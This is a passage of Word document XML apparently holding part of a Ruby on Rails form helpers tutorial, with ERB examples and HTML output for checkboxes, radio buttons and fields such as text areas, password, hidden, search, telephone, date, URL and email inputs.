              <w:t>name="pet_dog"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="checkbox"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="1"</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5B8A7D1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&lt;label</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>for="pet_dog"&gt;I own a dog&lt;/label&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AEE7FF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id="pet_cat"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="pet_cat"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="checkbox"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="1"</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5AAF72E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&lt;label</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>for="pet_cat"&gt;I own a cat&lt;/label&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F3E9A4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first parameter to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, of course, is the name of the input. The second parameter, naturally, is the value of the input. This value will be included in the form data (and be present in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) when the checkbox is checked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB0DF06" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1.3.2 Radio Buttons</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F68A52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Radio buttons, while similar to checkboxes, are controls that specify a set of options in which they are mutually exclusive (i.e., the user can only pick one):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0B93F06E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C937C1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radio_button_tag(:age, "child") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="010C526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label_tag(:age_child, "I am younger than 21") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50C2F1C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radio_button_tag(:age, "adult") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61C2DC8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label_tag(:age_adult, "I'm over 21") %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="457B725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Output:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5D736C1D" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BDD7CC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id="age_child"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="age"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="radio"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="child"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6B08684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&lt;label</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>for="age_child"&gt;I am younger than 21&lt;/label&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C948BE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id="age_adult"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="age"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="radio"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="adult"</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29C74A2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&lt;label</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>for="age_adult"&gt;I'm over 21&lt;/label&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3007811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As with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, the second parameter to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>radio_button_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the value of the input. Because these two radio buttons share the same name (age) the user will only be able to select one, and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:age]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will contain either “child” or “adult”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF0CA3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Always use labels for checkbox and radio buttons. They associate text with a specific option and make it easier for users to click the inputs by expanding the clickable region.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728A7EE9"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1.4 Other Helpers of Interest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4633B62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Other form controls worth mentioning are textareas, password fields, hidden fields, search fields, telephone fields, date fields, URL fields and email fields:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="596B582F" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48E05D7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text_area_tag(:message, "Hi, nice site", :size</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "24x6") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="626EBA3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password_field_tag(:password) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CEB4A0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hidden_field_tag(:parent_id, "5") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79835A7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search_field(:user, :name) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F3246F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telephone_field(:user, :phone) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06DA6E4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date_field(:user, :born_on) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04C5FBE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url_field(:user, :homepage) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A5E944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email_field(:user, :address) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0622EE9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Output:</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24C40D06" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0528302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&lt;textarea</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="message"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="message"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>cols="24"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rows="6"&gt;Hi, nice site&lt;/textarea&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71CC60C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id="password"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="password"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="password"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48AA4C0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id="parent_id"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="parent_id"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="5"</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48335AD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id="user_name"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="user[name]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="search"</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752FFF8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id="user_phone"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="user[phone]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="tel"</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4D6BDF8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id="user_born_on"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
